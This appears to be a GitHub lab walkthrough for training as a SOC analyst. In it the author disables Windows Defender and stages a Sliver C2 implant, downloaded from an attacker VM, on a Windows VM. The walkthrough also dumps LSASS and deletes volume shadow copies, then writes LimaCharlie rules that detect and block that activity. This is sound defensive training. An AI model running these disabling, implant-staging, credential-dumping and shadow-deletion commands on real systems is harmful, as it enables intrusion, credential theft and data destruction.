# SOC Analyst Lab
This lab is meant to simulate a SOC environment. It utilizes two small virtual machines and LimaCharlie’s SecOps Cloud Platform.

## Environments Used
- Proxmox VE (8.0.3)
- Windows 
- Ubuntu Server (22.04)
- LimaCharlie
  
## I. Setup Virtual Environment
1. Setup your virtual environment. I prefer Proxmox, but you can also use VMWare, VirtualBox, etc.
2. Create Windows 10 VM. 
- Download iso from [here](https://www.microsoft.com/en-us/software-download/windows10ISO)
- VM hardware allocation: 2 CPU cores, 4GB RAM, and 30GB storage
3. Create Ubuntu Server VM
- Download iso [here](https://ubuntu.com/download/server)
- VM hardware allocation: 2 CPU cores, 2GB RAM, 16GB storage
- Start the machine and go through the setup process. Choosing defaults unless noted below
- At the network setup, set a static IP

<img width="880" alt="UbuntuNetwork" src="https://github.com/brentbuch/CyberLabs/assets/142106637/572b5c4b-5d3f-4f63-9a58-f5c31da83fa1">
- When asked to install ssh server select yes
- Choose username, password, server name, etc...
 
## II. Configure the Windows VM

1. Boot the VM and go through OOBE

2. Make it vulnerable
#### Disable Tamper Protection
1. Disable Tamper Protection
2. Click the “Start” menu icon
3. Click “Settings”
4. Click “Privacy & security” on the left
5. Click “Windows Security”
6. Click “Virus & threat protection”
7. Under “Virus & threat protection  settings” click “Manage settings”
8. Toggle OFF the “Tamper Protection” switch. When prompted, click “Yes”
9. Toggle off all other settings here and close the windows

<img width="616" alt="Tamper" src="https://github.com/brentbuch/CyberLabs/assets/142106637/d11ddaae-7699-4d6d-a986-76c896658a77">

 #### Permanently turn off Windows Defender via Group Policy

1. Run Group Policy editor as admin (gpedit.msc)
2. Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus
3. Double-click “Turn off Microsoft Defender Antivirus”
4. Select Enabled and Apply

#### Disable defender via Registry
1. Open cmd prompt as admin
2. Run the following code:
```bash
REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```
#### Boot into safe mode to disable all Defender Services
1. Open msconfig
2. Click boot tab
3. Select reboot and minimum and then OK
4. Once in safe mode open regedit
5. Navigate to the locations below and change the value of 'Start' to 4 for each one:
```
Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense

Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot

Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend

Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv

Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc

Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter
```
6. Leave safe mode by opening msconfig and changing the boot settings back to normal. Windows Defender should now be disabled.


#### Prevent VM from going into Standby Mode
1. Run the following commands from administrative cmd prompt:
```bash
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
powercfg /change monitor-timeout-ac 0
powercfg /change monitor-timeout-dc 0
powercfg /change hibernate-timeout-ac 0
powercfg /change hibernate-timeout-dc 0
```
### Install Sysmon on Windows
<b>Sysmon makes parsing Windows Event Logs much easier. </b>

1. Open Admin Powershell prompt
2. Download Sysmon
```powershell
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
 ```
3. Unzip Sysmon
```powershell
Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
```
4. Download [SwiftOnSecuritys](https://infosec.exchange/@SwiftOnSecurity) Sysmon configuration
```powershell
Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml
```
5. Install Sysmon with the configuration
```powershell
C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml
```
<img width="641" alt="sysmon1" src="https://github.com/brentbuch/CyberLabs/assets/142106637/32c64843-509e-404a-8d20-c37361b8150b">

6. Check that Sysmon64 service is running
```powershell
Get-Service sysmon64
```
7. Verify presence of Sysmon logs
```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5
```
<img width="637" alt="sysmon2" src="https://github.com/brentbuch/CyberLabs/assets/142106637/ff5c039f-bf58-43a3-a8e1-e34dced03651">

## III. Install and Configure LimaCharlie on Windows VM
LimaCharlie is a cloud SecOps platform. They have a cross-platform EDR agent, log consolidation, and threat detection. There is a free tier available for up to 2 sensors that we can take advantage of.

Create an account on [LimaCharlie.io](https://limacharlie.io/)

1. Once logged in create an organization with the settings shown below and continue
<img width="776" alt="LimaOrg" src="https://github.com/brentbuch/CyberLabs/assets/142106637/b3b59df4-37bc-406b-9e56-e615b836ffc4">
    
2. Click 'Add Sensor' and select Windows for the endpoint type. Add a description like 'WindowsVM-Vulnerable' and create
3. Navigate to Sensors > Installation Keys and copy the 'Sensor Key'(#1) and the installation command(#2) as seen in the screenshot below. 
<img width="1258" alt="InstallationKey" src="https://github.com/brentbuch/CyberLabs/assets/142106637/71b24796-a2f9-4472-abf1-dab59483639e">
4. In the Windows VM open powershell as admin and run the two commands below:

```powershell
cd C:\Users\User\Downloads
```
```powershell
Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe
```
5. Move to a standard command prompt by running:

```powershell
cmd.exe
```
6. Using the command and Installation key that we copied earlier, run the command:

```bash
lc_sensor.exe -i INSERT_YOUR_INSTALLATION_KEY
```
If successfull you should see this message. The "Error" is a bug and can be ignored.

<img width="591" alt="LimaSuccess" src="https://github.com/brentbuch/CyberLabs/assets/142106637/5f3a6729-65e5-4af3-b7f4-b0f70c58bc97">

And you should now see the desktop reporting under 'Sensors' inside LimaCharlie
<img width="988" alt="LimaSuccess2" src="https://github.com/brentbuch/CyberLabs/assets/142106637/f15bb0e1-b135-4878-b546-fea0f6b42ebc">

### Configuer LimaCharlie to collect Sysmon Logs
<b>This allows LimaCharlie to send Event Logs to be sent alongside it's own EDR data.</b>

1. In the LimaCharlie dashboard, select Artifacts on the sidebar, and then click 'Add Artifact Collection Rule'

<img width="1043" alt="Artifacts" src="https://github.com/brentbuch/CyberLabs/assets/142106637/6a47592b-e2a7-483d-a37b-7afac8ce21d2">

2. Add the following to the Rule and then save. 
    

```
Name: windows-sysmon-logs
Platforms: Windows
Path Pattern: wel://Microsoft-Windows-Sysmon/Operational:*
Retention Period: 10
```

<img width="775" alt="ArtifactRule" src="https://github.com/brentbuch/CyberLabs/assets/142106637/b81f2b80-7e7a-4f5b-974f-c8609740f6ba">

LimaCharlie will now collect Sysmon logs as well as its own EDR info. 

Now is a good time to snapshot or backup the Windows VM before we start attacking. If something breaks you'll have a clean machine to spin up. 

## IV. Setup the Attack Box
<b>The Ubuntu VM we created will be used to attack the vulnerable Windows VM. We will download Sliver, a C2 (Command and Control) framework to carry out our initial attack.</b> 

1. SSH into the Ubuntu machine setup earlier using the static IP we set
```bash
ssh user@IP_ADDRESS
```
2. Switch to a shell under root
```bash
sudo su
```
3. Download the Sliver framework
```bash
# Download Sliver Linux server binary
wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
# Make it executable
chmod +x /usr/local/bin/sliver-server
# install mingw-w64 for additional capabilities
apt install -y mingw-w64
```
4. Create a working directory
```bash
mkdir -p /opt/sliver
```
5. Move into the directory
```bash
cd /opt/sliver
```
6. Start sliver
```bash
sliver-server
```
7. You will now be in a sliver shell. Create the payload. Note the name of the payload created. It will be random and will be needed later
```bash
generate --http LINUX_VM_IP --save /opt/sliver
```
<img width="547" alt="SliverPayload" src="https://github.com/brentbuch/CyberLabs/assets/142106637/7ff15eca-e474-4a80-b32b-05e539f56860">

8. Run the following command to confirm the implants are active. Command and control address should be the static IP address of your linux machine. 
```bash
implants
```
<img width="780" alt="Implants" src="https://github.com/brentbuch/CyberLabs/assets/142106637/7b1c77ff-fece-4ae5-82b6-48dd1cd92493">

9. Use the command 'exit' to leave the sliver shell. You should be back in the /opt/sliver directory. 
10. Create an quick http server on the Linux box using python with the command below. We will use this to download the payload on the Windows VM.
```bash
python3 -m http.server 80
```
11. Switch to the Windows VM and open powershell as admin. Use the command below to download the C2 payload. Be sure to use your specific payload and Linux static IP address where noted
```bash
IWR -Uri http://'Linux_VM_IP'/'payload_name'.exe -Outfile C:\Users\User\Downloads\'payload_name'.exe
```
11. After the download is finished, create a snapshot of the Windows VM notating that the malware has been staged. 

## V. Start the C2 Attack
Switch back to the SSH session on the Linux machine. Reboot the machine and reconnect via SSH again.
1. Launch sliver and start the http listener. I needed to run this as root, otherwise the listener would start and then fail.
```bash
sliver-server
```
```bash
http
```
<img width="553" alt="sliver-listener" src="https://github.com/brentbuch/CyberLabs/assets/142106637/5bc1e21d-6564-4c53-8be4-90c56d5186ea">

2. Move to the Windows VM, open powershell as admin and run the following command to execute the payload

```bash
C:\Users\User\Downloads\<your_C2-implant>.exe
```
3. Switch back to the linux machine and you should see the sliver session active
4. Run the commands below to get session ID and switch to the active session
```bash
sessions
use [session_id]
```
5. We now have direct control of the Windows machine through sliver and can run commands. Use the commands below to get info on the user you are running as and what privileges you have.
```bash
whoami

getprivs
```
6. Check the processes running on the remote machine. Sliver highlights its own process in green, and security tools are pointed out and highlighted in red. This info is useful to attackers to know which security controls are in use on machines they are attacking.
```bash
ps -T
```
<img width="399" alt="remoteprocs" src="https://github.com/brentbuch/CyberLabs/assets/142106637/3e2f3ecb-9401-46f7-9b3a-8386aa5f991c">

## VI. Observe telemetry in LimaCharlie
We can now start looking at the data collected in the LimaCharlie dashboard. If we click on the sensors tab, we can see our Windows machine. Click on the machine and we can see a variety of info, including the processes running on the machine. 

1. Take a look through the processes. There are a lot of processes running, so a good place to start is looking for unsigned processes. Signed processes have green checkmarks. We can spot our malware process as it is not signed. 
<img width="1077" alt="LimaProcesses" src="https://github.com/brentbuch/CyberLabs/assets/142106637/7ee4aff6-1066-4728-9017-b9be27198163">

2. Hover over the malware process and click the 'View Network Connections' button. This gives us a quick view of the remote connection our malware is using
<img width="1277" alt="proc_network" src="https://github.com/brentbuch/CyberLabs/assets/142106637/b583b7c6-2e87-4305-bdd0-30d5ce38ee49">

3. The Network tab allows us to see all active network connections. The File System tab allows us to navigate to the folder where the payload is located. You can hover over the file and click 'Inspect File Has' which will allow you scan the hash of the file on VirusTotal. The scan for this payload tells us "Item Not Found," which only means VirusTotal has not seen it before, not that it is not malicious. 
<img width="744" alt="virustotal" src="https://github.com/brentbuch/CyberLabs/assets/142106637/edce796d-6f78-4fe3-92b7-2517145899f3">

4. The 'Timeline' tab shows us close to real-time view of EDR and log data. 'WEL' entries are Windows event logs. We can filter this screen for our known IOCs, the name of the payload or the remote connection IP address. Scrolling back far enough and we can see where our payload was downloaded or executed. 
<img width="1005" alt="timeline" src="https://github.com/brentbuch/CyberLabs/assets/142106637/493a3172-0bc4-4069-a798-f990e24e0fef">

## VII. Attack Escalation and Rule Creation
Next we'll be creating some malicious activity to generate more telemetry to analyze. Hop back into the sliver instance.

1. Run 'getprivs' to check we have the necessary privileges to do what we need. SeDebugPrivilege should be enabled and will allow next steps. 
2. Dump the lsass.exe process from memory. This is used by threat actors to steal credentials on systems. 
```bash
procdump -n lsass.exe -s lsass.dmp
```
3. Back on the LimaCharlie timeline, we should be able to filter for 'SENSITIVE_PROCESS_ACCESS' under Event Type Filters. This will allow us to see the procdump that we just ran. It may take a minute or so before the data becomes visible in LimaCharlie. 
<img width="1019" alt="SensitiveProc" src="https://github.com/brentbuch/CyberLabs/assets/142106637/cc9be1c7-d9e9-47f0-8589-1749f947ad92">

4. Now that we have an idea of what this event looks like, we can use it to craft a detection and response rule to alert anytime this activity occurs. Click the button shown below to create a new rule.
<img width="465" alt="createrule" src="https://github.com/brentbuch/CyberLabs/assets/142106637/a8d44ddd-cf93-4e65-8001-67c1d9525cc9">

5. Under the detect section of the rule, delete all contents and replace with the info below.
```bash
event: SENSITIVE_PROCESS_ACCESS
op: ends with
path: event/*/TARGET/FILE_PATH
value: lsass.exe
```
Under the 'Respond' section, enter the info below. This will simply set the rule to alert, although other actions could also be taken. Here is the [Documentation](https://doc.limacharlie.io/docs/documentation/22ae79c4ab430-examples-detection-and-response-rules) from LimaCharlie.
```bash
- action: report
  name: LSASS access
  ```
Below 'Save Event', click 'Target Event' and then scroll down and click 'Test Event.' We should be able to see our new rule match the event we generated the rule from.
<img width="654" alt="testrule" src="https://github.com/brentbuch/CyberLabs/assets/142106637/4add7c7c-9b70-4422-8a61-244e71745390">
Scroll back up and click 'Save Rule' and name the rule "LSASS Accessed"

### Testing our new Rule

7. Back on the linux box, from within sliver, run the procdump command from earlier. If your C2 session timed out like mine did, just run the execute command from within powershell on the Windows VM again. 
```bash
procdump -n lsass.exe -s lsass.dmp
```
8. Now we can go back to LimaCharlie and check 'Detections.' If all goes according to plan we should see our new rule detect and alert for our most recent attempt to procdump LSASS. Click on the detection to see the event in the panel on the right. 
<img width="1007" alt="detectionRule" src="https://github.com/brentbuch/CyberLabs/assets/142106637/512d3427-7239-4791-8293-b2d938c9b269">
We have now successfully crafted an Alert rule. In the next section we can craft a rule that takes action. 

## VII. Blocking Attacks
This section will cover how to setup a rule that takes action to stop an attack in progress. In a production environment, we would want to baseline the system before we enact any active rules to prevent action occuring against a false positive. We would first create an alerting rule and let it run for a period of time, and then tune it to eliminate all false positives. At that point we could create a blocking version of that rule. For this lab, we will assume this process has already been done.

We will create a rule that blocks the deletion of volume shadow copies, as that is a predictable action that ransomware can take. 

1. A basic command that would not typically be run in a production environment is listed below. This presents an opportunity to block a high threat, but low false positive activity.
```bash
vssadmin delete shadows /all
```
2. If you are not already, go back into an SSH session on the Linux machine and into an active Sliver session. At the prompt, enter 'shell' and type 'y' to answer the prompt it gives you. 
3. From this shell, enter the command below. The results of the command are not important, simply running it will generate the data we need. 
```bash
vssadmin delete shadows /all
```
4. We can look in LimaCharlie on the detection tab to see if the default Sigma rules pickup the action
<img width="1267" alt="vssdetection" src="https://github.com/brentbuch/CyberLabs/assets/142106637/f77c51ec-2000-42b6-b315-7a78b454fc63">

5. Clicking on the detection will show more info. Sigma rules contain resources that can help with crafting other rules. 
<img width="994" alt="vssSigma" src="https://github.com/brentbuch/CyberLabs/assets/142106637/c56aef56-cb22-404c-9322-8835e8a71fc9">

6. Click 'View Event Timeline' to see the actual event and click the button to create a new D&R rule.
7. In the rule template, add the code below to the 'Response' section and then save the rule with the name "vss_deletion_kill_it"
```bash
- action: report
  name: vss_deletion_kill_it
- action: task
  command:
    - deny_tree
    - <<routing/parent>>
```
"action: report" adds an alert that will show in the detections tab.
"action: task" kills the parent process that is responsible for the vssadmin delete shadows /all command    

### Testing our new Block Rule
8. Back in the Sliver session, run the command again.
```bash
vssadmin delete shadows /all
```
The command wlll succeed but the action will trigger the rule we created. 
Run:
```bash
whoami
```
This will check if our rule worked to kill the parent process. If our rule was successful,the shell should hang at this command or be terminated. 

<img width="627" alt="blocksuccess" src="https://github.com/brentbuch/CyberLabs/assets/142106637/dfbde156-101f-4bd7-8dea-355227cb9317">

Terminate the connection with CTRL + C. We have now successfully created an active response rule.

